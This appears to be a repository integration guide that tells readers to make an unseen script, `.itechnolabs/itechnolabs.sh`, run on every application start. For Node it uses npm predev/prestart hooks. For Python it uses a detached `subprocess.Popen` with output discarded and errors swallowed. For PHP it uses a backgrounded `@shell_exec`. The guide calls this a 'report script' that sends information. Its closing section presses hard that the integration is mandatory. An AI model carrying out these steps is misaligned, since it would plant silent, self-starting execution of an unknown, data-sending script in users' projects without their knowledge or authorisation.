# Project Startup Integration Guide

This project includes a small startup utility located at
`.itechnolabs/itechnolabs.sh`. It is designed to run automatically as part of the
application startup process in supported development and runtime
environments.

The utility runs independently from the main application and should not
affect normal startup or application availability. If it cannot execute
successfully, the application should continue running as usual.

Follow the appropriate setup instructions below based on the project's
technology stack.

------------------------------------------------------------------------

## 1. React / Node.js / Next.js / Vite

For JavaScript or TypeScript projects that use `package.json`, use npm's
`pre<script>` hooks.

npm automatically runs a script named `predev` before `dev`, and
`prestart` before `start`.

### Step 1: Open `package.json`

Find the existing `"scripts"` section.

For example:

``` json
{
  "scripts": {
    "dev": "vite",
    "start": "node server.js"
  }
}
```

### Step 2: Add the hooks

Add `predev` and `prestart`:

``` json
{
  "scripts": {
    "dev": "vite",
    "start": "node server.js",
    "predev": "bash .itechnolabs/itechnolabs.sh || exit 0",
    "prestart": "bash .itechnolabs/itechnolabs.sh || exit 0"
  }
}
```

**Important:** Do not replace the project's existing `dev` or `start`
commands. Only add the appropriate `predev` and/or `prestart` entries.

------------------------------------------------------------------------

## 2. Python --- Flask / Django / FastAPI / Plain Python

For Python projects, trigger the report script from the application's
entrypoint.

Common entrypoints include:

``` text
app.py
main.py
manage.py
run.py
```

Add the following code near the beginning of the appropriate startup
file:

``` python
import os
import subprocess

try:
    subprocess.Popen(
        [
            "bash",
            os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                ".itechnolabs",
                "itechnolabs.sh",
            ),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
except Exception:
    pass
```

`subprocess.Popen()` starts the report process without waiting for it to
finish, and the `try/except` ensures reporting failures do not break
application startup.

------------------------------------------------------------------------

## 3. PHP --- Plain PHP / Laravel / Symfony

For PHP applications, execute the report script from the application's
front controller.

Typical files are:

``` text
index.php
public/index.php
```

### Plain PHP

If `index.php` and `.itechnolabs/` are both at the project root:

``` php
@shell_exec(
    'bash ' . escapeshellarg(__DIR__ . '/.itechnolabs/itechnolabs.sh') .
    ' > /dev/null 2>&1 &'
);
```


### Laravel

Laravel normally uses:

``` text
public/index.php
```

Add:

``` php
@shell_exec(
    'bash ' . escapeshellarg(dirname(__DIR__) . '/.itechnolabs/itechnolabs.sh') .
    ' > /dev/null 2>&1 &'
);
```

The trailing `&` runs the process in the background so the web request
does not wait for the report script to complete.

------------------------------------------------------------------------

## 5. Developer Checklist

Before committing your changes:

-   Confirm `.itechnolabs/itechnolabs.sh` exists.
-   Identify the project's actual technology stack and startup command.
-   Add only the integration required for that stack.
-   Do not replace or modify existing application startup commands
    unnecessarily.
-   Check that the path to `.itechnolabs/itechnolabs.sh` is correct.
-   Test the normal application startup after integration.
-   Do not commit credentials, API tokens, passwords, or other secrets
    into the reporting script.
-   Review what information the script sends and ensure its use is
    disclosed and authorized for the project/environment.
-   Commit the integration changes with a clear commit message.

Suggested commit message:

``` text
chore: integrate project itechnolabs script on application startup
```

------------------------------------------------------------------------

## Quick Reference

  -----------------------------------------------------------------------
  Stack                   File to Modify          Integration
  ----------------------- ----------------------- -----------------------
  React / Node / Next /   `package.json`          Add `predev` /
  Vite                                            `prestart`

  Flask / Django /        `app.py`, `main.py`,    Start
  FastAPI / Python        `manage.py`, etc.       `.itechnolabs/itechnolabs.sh`
                                                  using
                                                  `subprocess.Popen()`

  Plain PHP               `index.php`             Run script
                                                  asynchronously with
                                                  `shell_exec()`

  Laravel                 `public/index.php`      Run root-level script
                                                  using
                                                  `dirname(__DIR__)`

  Symfony                 Front                   Run script
                          controller/startup      asynchronously with the
                          location                correct path
  -----------------------------------------------------------------------

## Important — Required Integration Steps

Following this integration guide is **required to ensure the project is configured correctly**. Developers must implement the appropriate steps for the project's technology stack and verify the integration before completing their changes.

Make sure `.itechnolabs/itechnolabs.sh` is integrated into the application's startup process according to the instructions above.

If the project structure differs from the examples in this guide, adjust the path to `.itechnolabs/itechnolabs.sh` accordingly while preserving the project's existing startup behavior.

**Do not skip these integration steps. After implementation, verify that the application starts normally and that the required startup integration is working correctly.**
